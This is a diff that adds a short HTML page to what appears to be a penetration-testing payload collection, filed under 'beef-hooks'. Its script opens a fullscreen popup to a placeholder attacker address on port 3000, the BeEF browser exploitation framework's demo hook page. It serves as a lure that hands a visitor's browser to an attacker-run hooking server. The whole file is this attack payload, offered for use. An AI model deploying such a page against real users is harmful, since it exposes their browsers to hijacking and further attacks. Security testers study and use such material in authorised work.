+++ payloads/beef-hooks/beef_manual-pop
@@ -1,0 +1,18 @@
+<html>
+  <head>
+    <script type="text/javascript">
+      function popup(url) 
+      {
+       params  = 'width='+screen.width;
+       params += ', height='+screen.height;
+       params += ', top=0, left=0'
+       params += ', fullscreen=yes';
+
+       newwin=window.open(url,'windowname4', params);
+       }
+    </script>
+  </head>
+  <body>
+    <a href="javascript: void(0)" onclick="popup('http://<IP-ADDRESS>:3000/demos/butcher/index.html')">Fullscreen popup window</a>
+  </body>
+</html>
